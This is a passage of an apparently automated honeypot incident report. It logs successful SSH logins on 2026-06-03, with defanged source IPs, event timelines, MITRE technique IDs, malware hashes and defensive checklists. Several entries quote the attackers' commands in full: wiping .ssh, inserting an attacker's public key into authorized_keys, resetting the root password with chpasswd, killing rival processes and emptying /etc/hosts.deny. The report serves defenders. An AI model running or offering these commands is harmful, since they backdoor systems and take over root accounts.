- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32ac542d6fb9

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 07:57 |
| **Last Seen** | 2026-06-03 07:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 07:57:26` | `cowrie.session.connect` |
| `2026-06-03 07:57:26` | `cowrie.client.version` |
| `2026-06-03 07:57:26` | `cowrie.client.kex` |
| `2026-06-03 07:57:26` | `cowrie.login.success` |
| `2026-06-03 07:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a8c55a46ab6

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:11 |
| **Last Seen** | 2026-06-03 08:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:11:25` | `cowrie.session.connect` |
| `2026-06-03 08:11:25` | `cowrie.client.version` |
| `2026-06-03 08:11:25` | `cowrie.client.kex` |
| `2026-06-03 08:11:25` | `cowrie.login.success` |
| `2026-06-03 08:11:25` | `cowrie.session.params` |
| `2026-06-03 08:11:25` | `cowrie.command.input` |
| `2026-06-03 08:11:25` | `cowrie.command.failed` |
| `2026-06-03 08:11:25` | `cowrie.log.closed` |
| `2026-06-03 08:11:25` | `cowrie.session.params` |
| `2026-06-03 08:11:25` | `cowrie.command.input` |
| `2026-06-03 08:11:26` | `cowrie.session.file_download` |
| `2026-06-03 08:11:26` | `cowrie.log.closed` |
| `2026-06-03 08:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816044db140e

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:11 |
| **Last Seen** | 2026-06-03 08:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:11:27` | `cowrie.session.connect` |
| `2026-06-03 08:11:27` | `cowrie.client.version` |
| `2026-06-03 08:11:27` | `cowrie.client.kex` |
| `2026-06-03 08:11:28` | `cowrie.login.success` |
| `2026-06-03 08:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd98f4344f14

| Field | Detail |
|---|---|
| **Source IP** | `157.66.80[.]97` |
| **First Seen** | 2026-06-03 08:13 |
| **Last Seen** | 2026-06-03 08:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:13:11` | `cowrie.session.connect` |
| `2026-06-03 08:13:11` | `cowrie.client.version` |
| `2026-06-03 08:13:11` | `cowrie.client.kex` |
| `2026-06-03 08:13:11` | `cowrie.login.success` |
| `2026-06-03 08:13:11` | `cowrie.session.params` |
| `2026-06-03 08:13:11` | `cowrie.command.input` |
| `2026-06-03 08:13:11` | `cowrie.command.failed` |
| `2026-06-03 08:13:12` | `cowrie.log.closed` |
| `2026-06-03 08:13:12` | `cowrie.session.params` |
| `2026-06-03 08:13:12` | `cowrie.command.input` |
| `2026-06-03 08:13:12` | `cowrie.session.file_download` |
| `2026-06-03 08:13:12` | `cowrie.log.closed` |
| `2026-06-03 08:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.80[.]97` to AbuseIPDB if not already reported
- [ ] Block `157.66.80[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b577271cc72a

| Field | Detail |
|---|---|
| **Source IP** | `157.66.80[.]97` |
| **First Seen** | 2026-06-03 08:13 |
| **Last Seen** | 2026-06-03 08:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:13:26` | `cowrie.session.connect` |
| `2026-06-03 08:13:26` | `cowrie.client.version` |
| `2026-06-03 08:13:26` | `cowrie.client.kex` |
| `2026-06-03 08:13:26` | `cowrie.login.success` |
| `2026-06-03 08:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.80[.]97` to AbuseIPDB if not already reported
- [ ] Block `157.66.80[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8aa59d87d6

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:15 |
| **Last Seen** | 2026-06-03 08:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:15:21` | `cowrie.session.connect` |
| `2026-06-03 08:15:21` | `cowrie.client.version` |
| `2026-06-03 08:15:21` | `cowrie.client.kex` |
| `2026-06-03 08:15:22` | `cowrie.login.success` |
| `2026-06-03 08:15:22` | `cowrie.session.params` |
| `2026-06-03 08:15:22` | `cowrie.command.input` |
| `2026-06-03 08:15:22` | `cowrie.command.failed` |
| `2026-06-03 08:15:22` | `cowrie.log.closed` |
| `2026-06-03 08:15:22` | `cowrie.session.params` |
| `2026-06-03 08:15:22` | `cowrie.command.input` |
| `2026-06-03 08:15:22` | `cowrie.session.file_download` |
| `2026-06-03 08:15:22` | `cowrie.log.closed` |
| `2026-06-03 08:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a1e05b2971

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:15 |
| **Last Seen** | 2026-06-03 08:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:15:24` | `cowrie.session.connect` |
| `2026-06-03 08:15:24` | `cowrie.client.version` |
| `2026-06-03 08:15:24` | `cowrie.client.kex` |
| `2026-06-03 08:15:24` | `cowrie.login.success` |
| `2026-06-03 08:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-756465981cc7

| Field | Detail |
|---|---|
| **Source IP** | `60.205.248[.]70` |
| **First Seen** | 2026-06-03 08:20 |
| **Last Seen** | 2026-06-03 08:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:20:03` | `cowrie.session.connect` |
| `2026-06-03 08:20:03` | `cowrie.client.version` |
| `2026-06-03 08:20:03` | `cowrie.client.kex` |
| `2026-06-03 08:20:03` | `cowrie.login.success` |
| `2026-06-03 08:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.205.248[.]70` to AbuseIPDB if not already reported
- [ ] Block `60.205.248[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7afd16d40c7

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:21 |
| **Last Seen** | 2026-06-03 08:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:21:16` | `cowrie.session.connect` |
| `2026-06-03 08:21:16` | `cowrie.client.version` |
| `2026-06-03 08:21:16` | `cowrie.client.kex` |
| `2026-06-03 08:21:16` | `cowrie.login.success` |
| `2026-06-03 08:21:16` | `cowrie.session.params` |
| `2026-06-03 08:21:16` | `cowrie.command.input` |
| `2026-06-03 08:21:16` | `cowrie.command.failed` |
| `2026-06-03 08:21:17` | `cowrie.log.closed` |
| `2026-06-03 08:21:17` | `cowrie.session.params` |
| `2026-06-03 08:21:17` | `cowrie.command.input` |
| `2026-06-03 08:21:17` | `cowrie.session.file_download` |
| `2026-06-03 08:21:17` | `cowrie.log.closed` |
| `2026-06-03 08:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1533650f4875

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:21 |
| **Last Seen** | 2026-06-03 08:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:21:18` | `cowrie.session.connect` |
| `2026-06-03 08:21:18` | `cowrie.client.version` |
| `2026-06-03 08:21:18` | `cowrie.client.kex` |
| `2026-06-03 08:21:19` | `cowrie.login.success` |
| `2026-06-03 08:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6d2aa62e23

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:23 |
| **Last Seen** | 2026-06-03 08:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:23:08` | `cowrie.session.connect` |
| `2026-06-03 08:23:08` | `cowrie.client.version` |
| `2026-06-03 08:23:08` | `cowrie.client.kex` |
| `2026-06-03 08:23:08` | `cowrie.login.success` |
| `2026-06-03 08:23:08` | `cowrie.session.params` |
| `2026-06-03 08:23:08` | `cowrie.command.input` |
| `2026-06-03 08:23:08` | `cowrie.command.failed` |
| `2026-06-03 08:23:09` | `cowrie.log.closed` |
| `2026-06-03 08:23:09` | `cowrie.session.params` |
| `2026-06-03 08:23:09` | `cowrie.command.input` |
| `2026-06-03 08:23:09` | `cowrie.session.file_download` |
| `2026-06-03 08:23:09` | `cowrie.log.closed` |
| `2026-06-03 08:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efce69f77098

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-03 08:23 |
| **Last Seen** | 2026-06-03 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 08:23:10` | `cowrie.session.connect` |
| `2026-06-03 08:23:10` | `cowrie.client.version` |
| `2026-06-03 08:23:10` | `cowrie.client.kex` |
| `2026-06-03 08:23:11` | `cowrie.login.success` |
| `2026-06-03 08:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11da6e3b2c4f

| Field | Detail |
|---|---|
| **Source IP** | `197.243.14[.]52` |
| **First Seen** | 2026-06-03 09:01 |
| **Last Seen** | 2026-06-03 09:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 09:01:30` | `cowrie.session.connect` |
| `2026-06-03 09:01:30` | `cowrie.client.version` |
| `2026-06-03 09:01:31` | `cowrie.client.kex` |
| `2026-06-03 09:01:32` | `cowrie.login.success` |
| `2026-06-03 09:01:32` | `cowrie.session.params` |
| `2026-06-03 09:01:32` | `cowrie.command.input` |
| `2026-06-03 09:01:32` | `cowrie.command.failed` |
| `2026-06-03 09:01:33` | `cowrie.log.closed` |
| `2026-06-03 09:01:33` | `cowrie.session.params` |
| `2026-06-03 09:01:33` | `cowrie.command.input` |
| `2026-06-03 09:01:33` | `cowrie.session.file_download` |
| `2026-06-03 09:01:33` | `cowrie.log.closed` |
| `2026-06-03 09:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.14[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.243.14[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48404ca19b06

| Field | Detail |
|---|---|
| **Source IP** | `197.243.14[.]52` |
| **First Seen** | 2026-06-03 09:01 |
| **Last Seen** | 2026-06-03 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 09:01:36` | `cowrie.session.connect` |
| `2026-06-03 09:01:36` | `cowrie.client.version` |
| `2026-06-03 09:01:36` | `cowrie.client.kex` |
| `2026-06-03 09:01:37` | `cowrie.login.success` |
| `2026-06-03 09:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.14[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.243.14[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4b73a857ff

| Field | Detail |
|---|---|
| **Source IP** | `112.6.227[.]209` |
| **First Seen** | 2026-06-03 09:12 |
| **Last Seen** | 2026-06-03 09:13 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:qbVApW2pIbNk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 09:12:41` | `cowrie.session.connect` |
| `2026-06-03 09:12:42` | `cowrie.client.version` |
| `2026-06-03 09:12:42` | `cowrie.client.kex` |
| `2026-06-03 09:12:43` | `cowrie.login.success` |
| `2026-06-03 09:12:43` | `cowrie.session.params` |
| `2026-06-03 09:12:43` | `cowrie.command.input` |
| `2026-06-03 09:12:43` | `cowrie.command.failed` |
| `2026-06-03 09:12:43` | `cowrie.log.closed` |
| `2026-06-03 09:12:44` | `cowrie.session.params` |
| `2026-06-03 09:12:44` | `cowrie.command.input` |
| `2026-06-03 09:12:44` | `cowrie.session.file_download` |
| `2026-06-03 09:12:44` | `cowrie.log.closed` |
| `2026-06-03 09:12:56` | `cowrie.session.params` |
| `2026-06-03 09:12:56` | `cowrie.command.input` |
| `2026-06-03 09:12:56` | `cowrie.log.closed` |
| `2026-06-03 09:12:57` | `cowrie.session.params` |
| `2026-06-03 09:12:57` | `cowrie.command.input` |
| `2026-06-03 09:12:57` | `cowrie.log.closed` |
| `2026-06-03 09:12:58` | `cowrie.session.params` |
| `2026-06-03 09:12:58` | `cowrie.command.input` |
| `2026-06-03 09:12:58` | `cowrie.session.file_download` |
| `2026-06-03 09:12:58` | `cowrie.log.closed` |
| `2026-06-03 09:12:59` | `cowrie.session.params` |
| `2026-06-03 09:12:59` | `cowrie.command.input` |
| `2026-06-03 09:12:59` | `cowrie.log.closed` |
| `2026-06-03 09:13:00` | `cowrie.session.params` |
| `2026-06-03 09:13:00` | `cowrie.command.input` |
| `2026-06-03 09:13:00` | `cowrie.log.closed` |
| `2026-06-03 09:13:00` | `cowrie.session.params` |
| `2026-06-03 09:13:00` | `cowrie.command.input` |
| `2026-06-03 09:13:00` | `cowrie.command.input` |
| `2026-06-03 09:13:00` | `cowrie.log.closed` |
| `2026-06-03 09:13:01` | `cowrie.session.params` |
| `2026-06-03 09:13:01` | `cowrie.command.input` |
| `2026-06-03 09:13:01` | `cowrie.log.closed` |
| `2026-06-03 09:13:02` | `cowrie.session.params` |
| `2026-06-03 09:13:02` | `cowrie.command.input` |
| `2026-06-03 09:13:02` | `cowrie.log.closed` |
| `2026-06-03 09:13:03` | `cowrie.session.params` |
| `2026-06-03 09:13:03` | `cowrie.command.input` |
| `2026-06-03 09:13:03` | `cowrie.log.closed` |
| `2026-06-03 09:13:03` | `cowrie.session.params` |
| `2026-06-03 09:13:03` | `cowrie.command.input` |
| `2026-06-03 09:13:04` | `cowrie.log.closed` |
| `2026-06-03 09:13:04` | `cowrie.session.params` |
| `2026-06-03 09:13:04` | `cowrie.command.input` |
| `2026-06-03 09:13:04` | `cowrie.log.closed` |
| `2026-06-03 09:13:05` | `cowrie.session.params` |
| `2026-06-03 09:13:05` | `cowrie.command.input` |
| `2026-06-03 09:13:05` | `cowrie.log.closed` |
| `2026-06-03 09:13:05` | `cowrie.session.params` |
| `2026-06-03 09:13:05` | `cowrie.command.input` |
| `2026-06-03 09:13:05` | `cowrie.log.closed` |
| `2026-06-03 09:13:06` | `cowrie.session.params` |
| `2026-06-03 09:13:06` | `cowrie.command.input` |
| `2026-06-03 09:13:06` | `cowrie.log.closed` |
| `2026-06-03 09:13:07` | `cowrie.session.params` |
| `2026-06-03 09:13:07` | `cowrie.command.input` |
| `2026-06-03 09:13:07` | `cowrie.log.closed` |
| `2026-06-03 09:13:07` | `cowrie.session.params` |
| `2026-06-03 09:13:07` | `cowrie.command.input` |
| `2026-06-03 09:13:07` | `cowrie.log.closed` |
| `2026-06-03 09:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.227[.]209` to AbuseIPDB if not already reported
- [ ] Block `112.6.227[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af82c6f9fc1

| Field | Detail |
|---|---|
| **Source IP** | `118.194.252[.]168` |
| **First Seen** | 2026-06-03 09:35 |
| **Last Seen** | 2026-06-03 09:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
